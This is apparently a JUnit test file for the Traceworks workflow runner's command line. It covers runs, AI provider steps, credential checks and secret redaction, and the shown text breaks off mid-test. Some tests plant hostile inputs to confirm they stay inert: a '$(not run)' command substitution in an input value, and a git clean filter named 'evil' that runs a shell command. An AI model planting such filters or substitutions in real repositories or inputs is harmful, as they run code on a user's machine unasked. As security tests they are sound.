package traceworks.cli.main;

import traceworks.adapters.images.BuiltInImages;
import traceworks.adapters.record.FileRunStore;
import traceworks.cli.RuntimeSource;
import traceworks.core.ai.ToolCall;
import traceworks.core.ai.ToolPolicy;
import traceworks.core.ai.cli.CliAiProvider;
import traceworks.core.app.Images;
import traceworks.core.app.TraceworksVersion;
import traceworks.core.model.RunStatus;
import traceworks.core.model.StepStatus;
import traceworks.core.model.TriggerSource;
import traceworks.core.model.WorkflowDefinition;
import traceworks.core.port.AiCli.AiOutcome;
import traceworks.core.port.AiProvider;
import traceworks.core.port.AiProviders;
import traceworks.core.port.Clock;
import traceworks.core.port.CommandRunner.CommandResult;
import traceworks.core.port.ContainerRuntime;
import traceworks.core.port.RunEvent;
import traceworks.core.port.StoredRun;
import traceworks.core.record.RunRecorder;
import traceworks.core.record.RunStart;
import traceworks.core.port.CommandRunner.Connection;
import traceworks.core.port.Egress;
import traceworks.core.testing.FakeAiCli;
import traceworks.core.testing.FakeCommandRunner;
import traceworks.core.testing.FakeContainerRuntime;
import traceworks.core.testing.OwnThread;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.PrintStream;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Instant;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import static org.assertj.core.api.Assertions.assertThat;

/** The command line end to end: real adapters in a temporary home, real shell steps, no terminal unless a test gives one. */
class MainTest {

    /** The summary line {@code run <id> STATUS}; a UUID elsewhere in the output (a path, a step's output) is not it. */
    private static final Pattern RUN_ID = Pattern.compile("(?m)^run ([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-"
            + "[0-9a-f]{12}) [A-Z_]+$");

    @TempDir
    Path temp;
    private Path home;
    private Path work;
    /** The environment of the Traceworks process; a test adds what it needs, such as a secret. */
    private final Map<String, String> env = new java.util.HashMap<>(Map.of("TRACEWORKS_ACTOR", "tester"));

    private record Result(int code, String out, String err) {
    }

    /** The standard error of the last command as it was printed, with the lines broken for the terminal. */
    private String printedErr;
    /** The standard output of the last command as it was printed. */
    private String printedOut;

    @BeforeEach
    void directories() throws IOException {
        home = Files.createDirectories(temp.resolve("home"));
        work = Files.createDirectories(temp.resolve("work"));
    }

    private Path pkg(String name, String blocks) throws IOException {
        Path dir = Files.createDirectories(temp.resolve(name));
        Files.writeString(dir.resolve("workflow.json"),
                "{\"id\":\"" + name + "\",\"name\":\"" + name + " flow\",\"blocks\":[" + blocks + "]}");
        return dir;
    }

    private Path approvalPackage() throws IOException {
        return pkg("deploy", """
                {"type":"shell","name":"build","config":{"command":"echo built"}},
                {"type":"approval","name":"publish","config":{"question":"Publish it?","options":["Yes","No"]}},
                {"type":"shell","name":"done","config":{"command":"echo done"}}""");
    }

    private Path plainPackage() throws IOException {
        return pkg("plain", """
                {"type":"shell","name":"say","config":{"command":"echo hello"}}""");
    }

    private Result exec(String... args) {
        return execWithConsole(null, args);
    }

    /** Without a container runtime: a run is a host run, or refused; a test that runs containers gives a fake one. */
    private Result execWithConsole(String console, String... args) {
        return execWith(RuntimeSource.NONE, console, args);
    }

    private Result execWith(ContainerRuntime runtime, String console, String... args) {
        return execWith(RuntimeSource.of(runtime), console, args);
    }

    private Result execWith(RuntimeSource runtime, String console, String... args) {
        List<String> all = new ArrayList<>(List.of(args));
        if (args.length > 0 && !args[0].startsWith("--")) {
            all.add("--home");
            all.add(home.toString());
        }
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayOutputStream err = new ByteArrayOutputStream();
        int code = Main.run(all.toArray(String[]::new), new PrintStream(out, true, StandardCharsets.UTF_8),
                new PrintStream(err, true, StandardCharsets.UTF_8), Map.copyOf(env), work,
                console == null ? null : new ByteArrayInputStream(console.getBytes(StandardCharsets.UTF_8)), runtime);
        printedOut = out.toString(StandardCharsets.UTF_8);
        printedErr = err.toString(StandardCharsets.UTF_8);
        // What a command says, whatever an 80 column terminal breaks it into (Unbroken); printedErr is as printed
        return new Result(code, traceworks.cli.Unbroken.of(out.toString(StandardCharsets.UTF_8)),
                traceworks.cli.Unbroken.of(printedErr));
    }

    private Result runHost(Path pkg, String... more) {
        List<String> args = new ArrayList<>(List.of("run", pkg.toString(), "--allow-host-execution", "--no-input"));
        args.addAll(List.of(more));
        return exec(args.toArray(String[]::new));
    }

    private static String idOf(Result result) {
        Matcher m = RUN_ID.matcher(result.out());
        assertThat(m.find()).as(result.out()).isTrue();
        return m.group(1);
    }

    private String parkedRun() throws IOException {
        Result parked = runHost(approvalPackage());
        assertThat(parked.code()).as(parked.out() + parked.err()).isEqualTo(5);
        return idOf(parked);
    }

    private Path runFolder(String id) throws IOException {
        try (Stream<Path> days = Files.walk(home.resolve("runs"), 2)) {
            return days.filter(p -> p.getFileName().toString().equals(id)).findFirst().orElseThrow();
        }
    }

    // ---- global ----

    @Test
    void isTerminal_isFalseWithoutAConsole() {
        assertThat(Main.isTerminal(null)).isFalse();
    }

    @Test
    void version() {
        Result r = exec("--version");

        assertThat(r.code()).isZero();
        assertThat(r.out()).isEqualTo("traceworks " + TraceworksVersion.current() + "\n");
    }

    @Test
    void help_listsEveryCommand() {
        Result r = exec("--help");

        assertThat(r.code()).isZero();
        assertThat(r.out()).contains("usage: traceworks");
        for (String command : List.of("run", "resume", "approve", "answer", "cancel", "runs", "show", "watch",
                "verify", "render", "check", "images", "credentials")) {
            assertThat(r.out()).containsPattern("(?m)^  " + command + " ");
        }
    }

    @Test
    void commandHelp_printsItsUsage() {
        Result r = exec("run", "--help");

        assertThat(r.code()).isZero();
        assertThat(r.out()).contains("traceworks run <package>", "--allow-host-execution", "--input K=V");
    }

    /** The help of run says what an AI step needs, since no login of the host reaches a container. */
    @Test
    void runHelp_saysWhereAnAiStepsCredentialComesFrom() {
        Result r = exec("run", "--help");

        assertThat(r.out()).contains("credentials.json", "set <NAME>' (in credentials.json in the Traceworks home)",
                "CLAUDE: ANTHROPIC_API_KEY, CLAUDE_CODE_OAUTH_TOKEN",
                "PI: ANTHROPIC_API_KEY, ANTHROPIC_OAUTH_TOKEN, OPENAI_API_KEY, GEMINI_API_KEY, OPENROUTER_API_KEY",
                "claude setup-token", "docs/cli.md");
        assertThat(r.out().substring(r.out().indexOf("AI steps:")).lines()).allSatisfy(
                line -> assertThat(line.length()).as(line).isLessThanOrEqualTo(112));
    }

    @Test
    void helpOfACommandWithoutNotes_endsWithItsOptions() {
        Result r = exec("runs", "--help");

        assertThat(r.out()).endsWith("show this text" + System.lineSeparator()).doesNotContain("credentials.json");
    }

    @Test
    void noArguments_isAUsageError() {
        Result r = exec();

        assertThat(r.code()).isEqualTo(2);
        assertThat(r.err()).contains("see 'traceworks --help'");
    }

    @Test
    void aHomeWithoutACommand_isAUsageError_thatNamesTheMissingCommand() {
        Result homeOnly = exec("--home", home.toString());
        Result noValue = exec("--home");

        assertThat(homeOnly.code()).isEqualTo(2);
        assertThat(homeOnly.err()).contains("no command given").doesNotContain("--home needs a value");
        assertThat(noValue.code()).isEqualTo(2);
        assertThat(noValue.err()).contains("--home needs a value");
    }

    @Test
    void unknownCommandAndUnknownFlag_areUsageErrors() throws IOException {
        Result unknown = exec("frobnicate");
        Result flag = exec("runs", "--nope");

        assertThat(unknown.code()).isEqualTo(2);
        assertThat(unknown.err()).contains("unknown command 'frobnicate'");
        assertThat(flag.code()).isEqualTo(2);
        assertThat(flag.err()).contains("--nope").contains("see 'traceworks runs --help'");
        assertThat(flag.out()).isEmpty();
    }

    // ---- run ----

    @Test
    void run_withoutHostExecution_isAContainerRun_andExits6WithoutARuntime() throws IOException {
        Result r = exec("run", plainPackage().toString(), "--no-input");

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.err()).contains("no container runtime", "podman", "docker", "--allow-host-execution")
                .doesNotContain("Host execution is not allowed");
        assertThat(home.resolve("runs")).doesNotExist();
    }

    /** The tag the built-in shell image has in this build. */
    /** The tag of the built-in image {@code name}, looked up by its name. */
    private static String builtInTag(String name) {
        return Images.builtInTag(new BuiltInImages().all().stream().filter(image -> image.name().equals(name))
                .findFirst().orElseThrow());
    }

    private static String shellTag() {
        return builtInTag("shell");
    }

    /** The record says what the built-in and the package's images hold, and show prints it. */
    @Test
    void run_recordsWhatEachImageHolds_andShowPrintsIt() throws IOException {
        String shellId = "sha256:" + "5".repeat(64);
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), shellId)
                .on(shellId, FakeCommandRunner.ok("hi\n"));
        Path pkg = pkg("tooling", """
                {"type":"shell","name":"say","config":{"command":"echo hi"}}""");
        Path image = Files.createDirectories(pkg.resolve("images").resolve("tools"));
        Files.writeString(image.resolve("Dockerfile"), "FROM eclipse-temurin:21-jdk-noble@sha256:" + "a".repeat(64)
                + "\nLABEL org.opencontainers.image.description=\"the tools on JDK 21\"\nRUN true\n");

        Result r = execWith(runtime, null, "run", pkg.toString(), "--no-input");

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        String started = Files.readAllLines(runFolder(idOf(r)).resolve("events.jsonl")).getFirst();
        assertThat(started).contains("{\"reference\":\"shell\",\"base\":\"docker.io/library/debian:bookworm-slim\",\"description\":\"",
                "{\"reference\":\"./images/tools\",\"base\":\"eclipse-temurin:21-jdk-noble\",\"description\":"
                        + "\"the tools on JDK 21\"}");
        Result show = exec("show", idOf(r));
        assertThat(show.out()).contains("Images" + System.lineSeparator()
                + "| shell                    docker.io/library/debian:bookworm-slim", "| ./images/tools           eclipse-temurin:21-jdk-noble"
                + "   the tools on JDK 21");
    }

    @Test
    void run_inputsFrom_takesTheInputsOfAnEarlierRun_byAPrefix() throws IOException {
        Path pkg = pkg("again", """
                {"type":"shell","name":"say","config":{"command":"echo v={{ version }}"}}""");
        String first = idOf(runHost(pkg, "--input", "version=7"));

        Result again = runHost(pkg, "--inputs-from", first.substring(0, 8));

        assertThat(again.code()).as(again.err()).isZero();
        assertThat(again.out()).contains("output: v=7");
        Result unknown = runHost(pkg, "--inputs-from", "deadbeef");
        assertThat(unknown.code()).isEqualTo(2);
        assertThat(unknown.err()).contains("No run matches");
    }

    /**
     * A block's values reach its command as shell variables, on a real host run. The record keeps the command as
     * written and the values by name; show names them, and prints them with the outputs; describe lists the names.
     */
    @Test
    void run_values_reachTheCommandAsVariables_andShowAndDescribeNameThem() throws IOException {
        Path pkg = pkg("valued", """
                {"type":"shell","name":"say","config":{"values":{"GREETING":"Hello, {{ name }}","EMPTY":""},
                 "command":"printf '%s|%s' \\"$GREETING\\" \\"$EMPTY\\""}}""");

        Result run = runHost(pkg, "--input", "name=it's $(not run)");
        Result show = exec("show", idOf(run));
        Result withValues = exec("show", idOf(run), "--outputs");
        Result describe = exec("describe", pkg.toString());

        assertThat(run.code()).as(run.err()).isZero();
        assertThat(run.out()).contains("output: Hello, it's $(not run)|");
        assertThat(String.join("\n", Files.readAllLines(runFolder(idOf(run)).resolve("events.jsonl"))))
                .contains("\"type\":\"step.command\"", "\"values\":{\"sha256\":\"");
        assertThat(show.out()).contains("      values EMPTY, GREETING\n").doesNotContain("value GREETING:");
        assertThat(withValues.out()).contains("      values EMPTY, GREETING\n", "      value GREETING:\n"
                + "      | Hello, it's $(not run)\n");
        assertThat(Files.readString(runFolder(idOf(run)).resolve("run.html")))
                .contains("<details><summary>value <code>GREETING</code> (22 characters)</summary><pre>Hello,"
                        + " it&#39;s $(not run)</pre></details>");
        assertThat(describe.out()).contains("values GREETING, EMPTY");
    }

    @Test
    void run_inContainers_isTheDefault_andTheRecordSaysSo() throws IOException {
        String shellId = "sha256:" + "5".repeat(64);
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), shellId)
                .on(shellId, FakeCommandRunner.ok("hello from a container\n"));

        Result r = execWith(runtime, null, "run", plainPackage().toString(), "--no-input");

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(r.out()).contains("hello from a container");
        assertThat(runtime.runs()).hasSize(1);
        assertThat(runtime.runs().getFirst().args()).containsExactly("-c", "echo hello");
        assertThat(runtime.runs().getFirst().workingDirectory()).isEqualTo("/workspace");
        String started = Files.readAllLines(runFolder(idOf(r)).resolve("events.jsonl")).getFirst();
        assertThat(started).contains("\"execution\":\"container\"",
                "\"container_runtime\":{\"name\":\"fake\",\"version\":\"1.0.0\"}");
        assertThat(Files.readString(runFolder(idOf(r)).resolve("manifest.json")))
                .contains("\"reference\" : \"shell\"", "\"id\" : \"" + shellId + "\"");
    }

    @Test
    void run_withoutItsImages_exits6_namingEachWithTheCommandThatProvidesIt() throws IOException {
        Path pkg = pkg("imaged", """
                {"type":"shell","name":"a","config":{"command":"true","container_image":"alpine:3"}}""");

        Result r = execWith(new FakeContainerRuntime(), null, "run", pkg.toString(), "--no-input");

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.err()).contains("image " + shellTag() + " is missing: run 'traceworks images build'",
                "image alpine:3 is missing: run 'traceworks images build " + pkg + "'");
        assertThat(home.resolve("runs")).doesNotExist();
    }

    /** Claude is a configured AI provider: a step's call runs its CLI in the {@code claude} image. */
    @Test
    void run_anAiStep_runsTheClaudeCliInItsImage() throws IOException {
        String stream = """
                {"type":"system","subtype":"init","cwd":"/workspace","session_id":"s-1","tools":[]}
                {"type":"assistant","message":{"model":"claude-opus-5-5","content":[{"type":"text","text":"hi"}]}}
                {"type":"result","subtype":"success","result":"hi","usage":{"input_tokens":12,"output_tokens":3}}
                """;
        String claudeId = "sha256:" + "c".repeat(64);
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64))
                .present(builtInTag("claude"), claudeId)
                .present(builtInTag("egress"), "sha256:" + "e".repeat(64))
                .on(claudeId, FakeCommandRunner.ok(stream));
        env.put("ANTHROPIC_API_KEY", "sk-ant-api03-not-a-real-key-0000");
        Path pkg = pkg("ask", """
                {"type":"simple","name":"ask","config":{"command":"Say hi"}}""");

        Result r = execWith(runtime, null, "run", pkg.toString(), "--no-input");

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(runtime.runs()).hasSize(1);
        ContainerRuntime.ContainerRun call = runtime.runs().getFirst();
        assertThat(call.imageId()).isEqualTo(claudeId);
        assertThat(call.args()).startsWith("claude", "-p", "--output-format", "stream-json");
        assertThat(call.stdin()).isEqualTo("Say hi");
        assertThat(call.environment()).containsKeys("ANTHROPIC_API_KEY", "CLAUDE_CODE_DISABLE_CLAUDE_MDS");
        assertThat(Files.readString(runFolder(idOf(r)).resolve("events.jsonl")))
                .contains("\"type\":\"ai.response\"", "\"model\":\"claude-opus-5-5\"")
                .doesNotContain("sk-ant-api03-not-a-real-key-0000");
    }

    /** Pi is a configured AI provider: a step's call runs its CLI in the {@code pi} image, behind its stream filter. */
    @Test
    void run_anAiStepOfPi_runsThePiCliInItsImage() throws IOException {
        String stream = """
                {"type":"session","version":3,"id":"s-1","timestamp":"2026-11-05T02:33:29.158Z","cwd":"/workspace"}
                {"type":"message_end","message":{"role":"assistant","content":[{"type":"text","text":"hi"}],\
                "provider":"google","model":"gemini-2.0-flash","usage":{"input":12,"output":3},"stopReason":"stop"}}
                {"type":"agent_end","messages":[]}
                """;
        String piId = "sha256:" + "d".repeat(64);
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64))
                .present(builtInTag("pi"), piId)
                .present(builtInTag("egress"), "sha256:" + "e".repeat(64))
                .on(piId, FakeCommandRunner.ok(stream));
        env.put("GEMINI_API_KEY", "gemini-not-a-real-key-0000");
        Path pkg = pkg("ask", """
                {"type":"simple","name":"ask","config":{"command":"Say hi","provider":"PI",\
                "model":"google/gemini-2.0-flash"}}""");

        Result r = execWith(runtime, null, "run", pkg.toString(), "--no-input");

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(runtime.runs()).hasSize(1);
        ContainerRuntime.ContainerRun call = runtime.runs().getFirst();
        assertThat(call.imageId()).isEqualTo(piId);
        assertThat(call.args().subList(0, 2)).containsExactly("sh", "-c");
        assertThat(call.args().subList(3, 10)).containsExactly("sh", "pi", "-p", "--no-session", "--no-context-files",
                "--mode", "json");
        assertThat(call.args()).containsSequence("--provider", "google", "--model", "gemini-2.0-flash");
        assertThat(call.stdin()).isEqualTo("Say hi");
        assertThat(call.environment()).containsOnlyKeys("GEMINI_API_KEY");
        assertThat(Files.readString(runFolder(idOf(r)).resolve("events.jsonl")))
                .contains("\"type\":\"ai.response\"", "\"model\":\"google/gemini-2.0-flash\"",
                        "\"input_tokens\":12")
                .doesNotContain("gemini-not-a-real-key-0000");
    }

    /**
     * Codex is not supported: a run of a workflow that names it is refused by the check before it, and with
     * {@code --no-check} by the engine's own admission at the start.
     */
    @Test
    void run_aWorkflowOfCodex_isRefusedAtTheStart() throws IOException {
        Path pkg = Files.createDirectories(temp.resolve("ask"));
        Files.writeString(pkg.resolve("workflow.json"), """
                {"id":"ask","name":"ask flow","blocks":[{"type":"simple","name":"ask",\
                "config":{"command":"Say hi","provider":"codex"}}]}""");
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64));

        Result checked = execWith(runtime, null, "run", pkg.toString(), "--no-input");
        Result r = execWith(runtime, null, "run", pkg.toString(), "--no-input", "--no-check");

        assertThat(checked.code()).as(checked.out() + checked.err()).isEqualTo(6);
        assertThat(checked.out()).as("no run started").isEmpty();
        assertThat(checked.err()).contains("unsupported-provider", "Codex is not supported", "the run is refused");
        assertThat(r.code()).as(r.out() + r.err()).isEqualTo(6);
        assertThat(r.out()).contains("workflow refused", "Codex is not supported; Traceworks runs Claude and Pi");
    }

    /**
     * A refusal with several reasons loses none of them in the summary a person reads: a line cut at the usual
     * length would drop the later ones, so the refusal of the admission is printed whole.
     */
    @Test
    void run_aWorkflowRefusedForSeveralReasons_listsEveryReasonInTheSummary() throws IOException {
        Path pkg = Files.createDirectories(temp.resolve("broken"));
        Files.writeString(pkg.resolve("workflow.json"), """
                {"id":"broken","name":"broken flow","requires":["time.travel"],"blocks":[\
                {"type":"levitate","name":"unknown_type","config":{}},\
                {"type":"shell","name":"plain","config":{"command":"true"}},\
                {"type":"telepathy","name":"last","config":{}}]}""");
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64));

        Result r = execWith(runtime, null, "run", pkg.toString(), "--no-input", "--no-check");

        assertThat(r.code()).as(r.out() + r.err()).isEqualTo(6);
        assertThat(r.out()).containsPattern("(?m)^  error   workflow refused: requires names \"time\\.travel\", which"
                + " Traceworks does not know \\(known: .*ai\\.model_choice\\); Block 1 \"unknown_type\": unknown block"
                + " type \"levitate\" .*; Block 3 \"last\": unknown block type \"telepathy\" .*\\)$");
    }

    @Test
    void check_aWorkflowOfCodex_reportsAnError() throws IOException {
        Path pkg = Files.createDirectories(temp.resolve("ask"));
        Files.writeString(pkg.resolve("workflow.json"), """
                {"id":"ask","name":"ask flow","provider":"CODEX","blocks":[{"type":"simple","name":"ask",\
                "config":{"command":"Say hi"}}]}""");

        Result r = exec("check", pkg.toString());

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.out()).contains("ERROR", "unsupported-provider", "Codex is not supported");
        assertThat(r.out()).doesNotContain("unknown-provider");
    }

    /**
     * {@code check} and {@code describe} read the operator's model servers from the {@code traceworks.json} of the
     * home they run with: a backend declared there is no unknown backend, one nobody declared stays an error, and a
     * model the server does not list is an error too.
     */
    @Test
    void check_andDescribe_knowTheLocalBackendsOfTheHome_andKeepTheErrorForOneNobodyDeclared() throws IOException {
        Path pkg = Files.createDirectories(temp.resolve("local"));
        Files.writeString(pkg.resolve("workflow.json"), """
                {"id":"local","name":"local flow","provider":"PI","blocks":[{"type":"simple","name":"ask",\
                "config":{"command":"Say hi","model":"llm/qwen2.5-coder:7b"}}]}""");

        Result undeclared = exec("check", pkg.toString());

        assertThat(undeclared.code()).isEqualTo(6);
        assertThat(undeclared.out()).as("what to do is in the part of the line a terminal shows")
                .contains("ERROR", "unknown-model-backend", "names the backend llm, which is no backend of a provider"
                        + " (anthropic, google, openai, openrouter) and no model server that local_models in"
                        + " traceworks.json declares");

        Files.writeString(home.resolve("traceworks.json"), """
                {"local_models": {"llm": {"url": "http://llm.internal:8080/v1", "api": "openai-completions",
                  "models": ["qwen2.5-coder:7b"]}}}""");
        Result declared = exec("check", pkg.toString());
        Result describe = exec("describe", pkg.toString());

        assertThat(declared.code()).as(declared.out() + declared.err()).isZero();
        assertThat(declared.out()).doesNotContain("unknown-model-backend");
        assertThat(describe.code()).as(describe.err()).isZero();
        assertThat(describe.out()).contains("model llm/qwen2.5-coder:7b runs on the local backend llm at"
                + " http://llm.internal:8080/v1 (local_models in traceworks.json)");

        Files.writeString(pkg.resolve("workflow.json"), Files.readString(pkg.resolve("workflow.json"))
                .replace("llm/qwen2.5-coder:7b", "llm/llama3"));
        Result unlisted = exec("check", pkg.toString());

        assertThat(unlisted.code()).isEqualTo(6);
        assertThat(unlisted.out()).contains("unknown-model-backend", "The local backend llm does not serve the model"
                + " llama3");

        Files.writeString(home.resolve("traceworks.json"), """
                {"local_models": {"llm": {"url": "http://localhost:11434/v1", "api": "openai-completions",
                  "models": ["llama3"]}}}""");
        Result loopback = exec("check", pkg.toString());

        assertThat(loopback.code()).as("a setting that is refused refuses every command that reads it").isEqualTo(6);
        assertThat(loopback.err()).contains("names this machine's loopback (localhost)");
    }

    @Test
    void run_anAiStepWithoutAClaudeCredential_exits6_namingThem() throws IOException {
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64))
                .present(builtInTag("claude"), "sha256:" + "c".repeat(64));
        Path pkg = pkg("ask", """
                {"type":"simple","name":"ask","config":{"command":"Say hi"}}""");

        Result r = execWith(runtime, null, "run", pkg.toString(), "--no-input");

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.err()).contains("AI provider CLAUDE has no credential",
                "ANTHROPIC_API_KEY, CLAUDE_CODE_OAUTH_TOKEN",
                "'claude setup-token' on the host prints a token for CLAUDE_CODE_OAUTH_TOKEN");
        assertThat(runtime.runs()).isEmpty();
    }

    @Test
    void run_inTheHomeDirectory_exits6() throws IOException {
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64));

        Result r = execWith(runtime, null, "run", plainPackage().toString(), "--no-input", "--workspace",
                home.toString());

        assertThat(r.code()).isEqualTo(6);
        assertThat(r.err()).contains("the workspace " + home + " cannot be mounted", "Traceworks home");
        assertThat(runtime.runs()).isEmpty();
    }

    private static void git(Path dir, String... args) throws Exception {
        List<String> command = new ArrayList<>(List.of("git", "-c", "core.fsmonitor=false", "-c", "user.name=t",
                "-c", "user.email=t@example.org", "-c", "commit.gpgsign=false", "-C", dir.toString()));
        command.addAll(List.of(args));
        Process p = new ProcessBuilder(command).redirectErrorStream(true)
                .redirectInput(ProcessBuilder.Redirect.from(new java.io.File("/dev/null"))).start();
        p.getInputStream().readAllBytes();
        assertThat(p.waitFor()).as(String.join(" ", args)).isZero();
    }

    /** A committed package whose own git config has a clean filter that leaves a marker when it runs. */
    private Path packageWithACleanFilter(Path marker) throws Exception {
        return withACleanFilter(plainPackage(), marker);
    }

    private Path withACleanFilter(Path pkg, Path marker) throws Exception {
        git(pkg, "init", "-q");
        git(pkg, "add", ".");
        git(pkg, "commit", "-q", "-m", "init");
        Files.writeString(pkg.resolve(".gitattributes"), "* filter=evil\n");
        Files.writeString(pkg.resolve(".git/config"), Files.readString(pkg.resolve(".git/config"))
                + "[filter \"evil\"]\n\tclean = touch '" + marker + "'; cat\n");
        Files.setLastModifiedTime(pkg.resolve("workflow.json"), java.nio.file.attribute.FileTime.from(
                java.time.Instant.now().plusSeconds(60)));
        return pkg;
    }

    @Test
    void aPackagesCleanFilter_runsNeitherInCheck_norInARefusedRun_norInARun() throws Exception {
        Path marker = temp.resolve("filter-ran");
        Path pkg = packageWithACleanFilter(marker);

        Result check = exec("check", pkg.toString());
        Result refused = exec("run", pkg.toString(), "--no-input");
        Result run = runHost(pkg, "--quiet");

        assertThat(check.code()).as(check.out() + check.err()).isZero();
        assertThat(refused.code()).isEqualTo(6);
        assertThat(run.code()).as(run.out() + run.err()).isZero();
        assertThat(marker).doesNotExist();
    }

    @Test
    void resume_withoutHostExecution_exits6_andRunsNeitherAStepNorAFilter() throws Exception {
        Path marker = temp.resolve("filter-ran");
        String id = idOf(runHost(withACleanFilter(approvalPackage(), marker)));
        assertThat(exec("approve", id, "--answer", "Yes").code()).isZero();

        Result refused = exec("resume", id, "--no-input");
        Result resumed = exec("resume", id, "--no-input", "--allow-host-execution");

        assertThat(refused.code()).as(refused.out() + refused.err()).isEqualTo(6);
        assertThat(refused.err()).contains("Host execution is not allowed", "--allow-host-execution");
        assertThat(refused.out()).doesNotContain("output: done");
        assertThat(resumed.code()).as(resumed.out() + resumed.err()).isZero();
        assertThat(resumed.out()).contains("output: done");
        assertThat(marker).doesNotExist();
    }

    @Test
    void run_withALedgerThatCannotBeCreated_exits6_andCreatesNoRun() throws IOException {
        Files.writeString(home.resolve("ledger"), "a file, not a directory");

        Result r = runHost(plainPackage());

        assertThat(r.code()).as(r.out() + r.err()).isEqualTo(6);
        assertThat(r.err()).contains("ledger");
        assertThat(home.resolve("runs")).doesNotExist();
    }

    @Test
    void run_completes_exits0_andSummarisesTheRun() throws IOException {
        Result r = runHost(plainPackage());

        assertThat(r.code()).as(r.err()).isZero();
        assertThat(r.out()).contains("run started: plain flow", "$ echo hello", "output: hello", "run finished: COMPLETED")
                .containsPattern("(?m)^run [0-9a-f-]{36} COMPLETED$")
                .contains("run.html");
        assertThat(runFolder(idOf(r)).resolve("run.html")).isRegularFile();
    }

    @Test
    void unnamedBlocks_run_show_andRender() throws IOException {
        Path pkg = pkg("unnamed", """
                {"type":"shell","config":{"command":"echo first"}},
                {"type":"shell","name":"second","config":{"command":"echo two"}},
                {"type":"shell","name":"third","config":{"command":"echo {{ block.second.output }}"}}""");

        Result run = runHost(pkg);
        String id = idOf(run);
        Result show = exec("show", id);
        Path html = runFolder(id).resolve("run.html");
        Files.delete(html);
        Result render = exec("render", id);

        assertThat(run.code()).as(run.out() + run.err()).isZero();
        assertThat(run.out()).contains("step 0  (unnamed) [shell] started").doesNotContain("null");
        assertThat(show.code()).as(show.out() + show.err()).isZero();
        assertThat(show.out()).contains("(unnamed)", "second", "third").doesNotContain("null");
        assertThat(render.code()).as(render.out() + render.err()).isZero();
        assertThat(Files.readString(html)).contains("(unnamed)");
    }

    /**
     * Review focus 2: a step echoes its secrets, writes one into a scratch file, and fails with it in its error.
     * No byte of the home (its run folder and ledger; the scratch directory and credentials.json aside) and no
     * line on the terminal, of the run and of {@code show}, holds a value; the output the checkpoint refers to holds
     * the replacement.
     */
    /** {@code secret_names} in traceworks.json limits what a package may take from the operator's shell. */
    @Test
    void secretNames_keepsAnEnvironmentValueFromTheRun_untilTheListNamesIt() throws IOException {
        env.put("DEPLOY_TOKEN", "tw-env-s3cr3t-Rk4Wb8Nc1");
        Path pkg = pkg("needs", """
                {"type":"shell","name":"deploy","config":{"command":"echo got $DEPLOY_TOKEN","secrets":["DEPLOY_TOKEN"]}}""");
        Files.writeString(home.resolve("traceworks.json"), "{\"secret_names\": [\"OTHER_NAME\"]}");

        Result kept = runHost(pkg);

        assertThat(kept.code()).isEqualTo(6);
        assertThat(kept.err()).contains("secrets without a value: DEPLOY_TOKEN",
                "DEPLOY_TOKEN is set in the environment, but 'secret_names' in traceworks.json does not allow it")
                .doesNotContain("tw-env-s3cr3t");
        assertThat(home.resolve("runs")).doesNotExist();

        Files.writeString(home.resolve("traceworks.json"), "{\"secret_names\": [\"DEPLOY_TOKEN\"]}");
        Result allowed = runHost(pkg);

        assertThat(allowed.code()).as(allowed.err()).isZero();
        assertThat(allowed.out()).contains("output: got [redacted:DEPLOY_TOKEN]");
    }

    /** An AI provider's credential is the operator's own setting, not a package's secret: the list does not govern it. */
    @Test
    void secretNames_doesNotGovernTheAiProvidersCredentials() throws IOException {
        String stream = """
                {"type":"system","subtype":"init","cwd":"/workspace","session_id":"s-1","tools":[]}
                {"type":"result","subtype":"success","result":"hi","usage":{"input_tokens":12,"output_tokens":3}}
                """;
        String claudeId = "sha256:" + "c".repeat(64);
        FakeContainerRuntime runtime = new FakeContainerRuntime().present(shellTag(), "sha256:" + "5".repeat(64))
                .present(builtInTag("claude"), claudeId)
                .present(builtInTag("egress"), "sha256:" + "e".repeat(64))
                .on(claudeId, FakeCommandRunner.ok(stream));
        env.put("ANTHROPIC_API_KEY", "sk-ant-api03-not-a-real-key-0000");
        Files.writeString(home.resolve("traceworks.json"), "{\"secret_names\": []}");
        Path pkg = pkg("ask", """
                {"type":"simple","name":"ask","config":{"command":"Say hi"}}""");

        Result r = execWith(runtime, null, "run", pkg.toString(), "--no-input");

        assertThat(r.code()).as(r.out() + r.err()).isZero();
        assertThat(runtime.runs().getFirst().environment()).containsKey("ANTHROPIC_API_KEY");
    }

    @Test
    void secretNeverReachesTheRecord() throws Exception {
        String fileSecret = "tw-file-s3cr3t-Xq7Lm2Pz9";
        String envSecret = "tw-env-s3cr3t-Rk4Wb8Nc1";
        Path credentials = home.resolve("credentials.json");
        Files.writeString(credentials, "{\"DEPLOY_TOKEN\": \"" + fileSecret + "\"}");
        Files.setPosixFilePermissions(credentials,
                java.nio.file.attribute.PosixFilePermissions.fromString("rw-------"));
        env.put("API_TOKEN", envSecret);
